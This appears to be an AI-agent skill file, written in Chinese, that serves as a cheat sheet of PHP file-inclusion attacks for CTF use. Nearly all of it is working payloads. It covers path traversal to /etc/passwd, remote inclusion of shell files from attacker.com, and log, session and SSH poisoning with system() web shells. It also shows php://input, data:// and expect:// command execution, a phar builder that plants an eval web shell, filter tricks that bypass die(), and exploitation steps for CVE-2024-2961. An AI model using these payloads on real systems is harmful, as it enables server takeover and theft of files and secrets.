---
name: lfi-lfi-detail
description: Use when encountering lfi漏洞利用和文件读取技术
---

# 本地文件包含

## Info

- **Domain**: web
- **Tags**: web, lfi, file-inclusion

# LFI详细分类

## 1. 本地文件包含 (LFI)

```
?page=../../../../etc/passwd
?page=/etc/passwd
?page=....//....//....//etc/passwd
```

---

## 2. 远程文件包含 (RFI)

```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.txt
```

---

## 3. 日志投毒

### Apache日志

```
访问: <?php system($_GET['cmd']);?>
?page=/var/log/apache2/access.log&cmd=whoami
?page=/var/log/apache2/error.log
```

### SSH日志

```
ssh "<?php system('id');?>"@target.com
?page=/var/log/auth.log&cmd=id
```

### Nginx日志

```
?page=/var/log/nginx/access.log
?page=/var/log/nginx/error.log
```

---

## 4. 伪协议利用

### PHP://input

```
?page=php://input
POST: <?php system('id'); ?>
```

### PHP://filter

```
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

### data://

```
?page=data://text/plain,<?php system('id');?>
?page=data:text/plain,<?php system('id');?>
```

### expect://

```
?page=expect://id
?page=expect://whoami
```

---

## 5. 目录遍历

```
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

## 6. PHP Filter链

### 读取文件

```
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=convert.base64-encode/resource=index.php
```

### 编码转换

```
?page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

---

## 7. PHP Input

```
?page=php://input
POST: <?php system($_GET['c']); ?>&c=whoami
```

---

## 8. PHP Data

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

---

## 9. PHP Zip

```
?page=zip://shell.jpg#shell.php
?page=phar://shell.jpg/shell.php
```

---

## 10. Phar反序列化

```
?page=phar://upload/shell.jpg/shell.php
?page=phar://../../../var/www/html/uploads/shell.jpg/shell
```

---

## 11. Session文件包含

### 默认路径

```
/tmp/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

### 利用

```
1. 登录并设置username为恶意代码
2. 包含session文件
?page=/tmp/sess_xxxxx&cmd=whoami
```

---

## 12. Proc文件系统

```
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/self/fd/1
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/unix
```

---

## 13. 绕过技术

### 空字节截断

```
?page=shell.php%00.jpg
?page=shell.php\0.jpg
```

### 双编码

```
?page=..%252f..%252f..%252fetc%252fpasswd
```

---

## 14. PHP包含函数详解

```php
include()         // 执行到该函数时才包含文件, 错误时发警告并继续
include_once()    // 重复包含同一文件时只加载一次
require()         // 错误时输出错误信息并停止脚本执行
require_once()    // 同上, 但重复调用只加载一次
```

---

## 15. PHP Filter详细

### 过滤器类型

| 类型 | 过滤器 | 作用 |
|------|--------|------|
| 字符串 | string.rot13, string.toupper, string.tolower | 字符串转换 |
| 转换 | convert.base64-encode/decode, convert.quoted-printable-encode/decode | 编码转换 |
| 压缩 | zlib.deflate, zlib.inflate, bzip2.compress, bzip2.decompress | 压缩解压 |
| 编码转换 | convert.iconv.<input>.<output> | 字符集转换 |

### Filter绕过die()
```
当写入文件时自动添加die(): file_put_contents($file,"<?php die('大佬别秀了');?>".content)
绕过: php://filter/write=convert.rot13-encode/resource=shell.php
POST: <?cuc cucvasb();?>  (ROT13编码的phpinfo)
→ die内容被编码, 我们的代码被解码回来
```

### Filter write操作
```
php://filter/write=convert.base64-encode/resource=shell.php
php://filter/write=convert.base64-decode/resource=shell.php
```

---

## 16. CVE-2024-2961 (iconv缓冲区溢出RCE)

```
影响: PHP标准文件读取操作(file_get_contents, readfile, fgets等)
利用: php://filter/convert.iconv通过ISO-2022-CN-EXT字符集转换触发缓冲区溢出
效果: 文件读取→RCE

利用步骤:
1. 读取/proc/self/maps获取libc版本
   ?file=php://filter/read=convert.base64-encode/resource=/proc/self/maps
2. 读取libc.so文件
3. 使用exploit脚本生成payload
   https://github.com/kezibei/php-filter-iconv
4. 访问生成的shell.php执行命令
```

---

## 17. 无回显文件读取

```
基于Oracle的错误攻击法
https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle
https://github.com/synacktiv/php_filter_chains_oracle_exploit
```

---

## 18. include配合Phar RCE

```php
<?php
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$stub = <<<'STUB'
<?php system('echo "<?php eval(\$_POST[1]);?>" > /var/www/html/shell.php');
__HALT_COMPILER();
STUB;
$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>
```

### gzip绕过检测
```python
import gzip
with open('exploit.phar', 'rb') as f:
    data = f.read()
compressed = gzip.compress(data)
# include会自动检测gzip并解压, 文件名需有.phar
```

---

## 19. 日志文件路径

```
Nginx:
  /var/log/nginx/access.log
  /var/log/nginx/error.log

Apache (Debian/Ubuntu):
  /var/log/apache2/access.log
  /var/log/apache2/error.log

Apache (CentOS/RHEL):
  /var/log/httpd/access_log
  /var/log/httpd/error_log

Apache (Windows):
  Apache安装目录/logs/
```

### 失败日志写马
```
访问不存在的PHP文件 → 写入error.log
/<?php eval($_POST[1]);?>.php
→ 包含error.log执行代码
```

---

## 20. 敏感文件读取

```
../../../docker-entrypoint.sh    # Docker入口脚本
/etc/hosts                        # 网卡IP信息
/proc/net/arp                     # ARP缓存表(内网主机发现)
/proc/net/fib_trie                # 路由信息
```

### 协议叠加

```
?page=php://filter/convert.base64-encode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

## 22. 协议解析差异（file_get_contents vs include）

**核心**: `file_get_contents` 和 `include` 对同一协议的处理不同，可绕过安全检查。

```php
// 安全检查
if (!stripos(file_get_contents($_GET['page']), '<?')) {
    include($_GET['page']);  // 危险!
}
```

| 函数 | `data:,a/profile` 的处理 |
|------|--------------------------|
| `file_get_contents` | 解析为 data URI，返回内容 `"a/profile"`（无害） |
| `include` | 无法识别宽松格式，回退到文件系统查找 `./data:,a/profile` |

**利用流程**:
1. 通过 `X-Forwarded-For: data:,a` 创建目录 `data:,a/`
2. 通过 User-Agent 注入 PHP 代码到该目录下的 `profile` 文件
3. 请求 `?page=data:,a/profile`
4. 检查阶段: `file_get_contents` 返回无害内容 → 通过
5. 执行阶段: `include` 从文件系统加载 → 执行恶意代码

---

## 23. 文件读取 Trick

### /proc/self/fd/ 读取

当文件名长度超过限制时可以从内存中读取：

```bash
ls /proc/self/fd/数字   # 尝试不同数字
# 或更短的路径:
ls /dev/fd/数字
```

**原理**: 进程打开的文件描述符可通过 `/proc/self/fd/N` 或 `/dev/fd/N` 访问，payload 较短，适合文件名长度受限的场景。

---

## 24. CTF 检查清单

- [ ] 尝试基础路径遍历 `../../../../etc/passwd`
- [ ] 尝试 php://filter 读取源码
- [ ] 尝试 php://input 执行代码
- [ ] 尝试 data:// 协议
- [ ] 尝试 session 文件包含
- [ ] 尝试日志投毒（Apache/Nginx/SSH）
- [ ] 尝试 /proc/self/environ
- [ ] 尝试 phar:// 反序列化
- [ ] 尝试 CVE-2024-2961 iconv RCE
- [ ] 检查 file_get_contents 与 include 的协议解析差异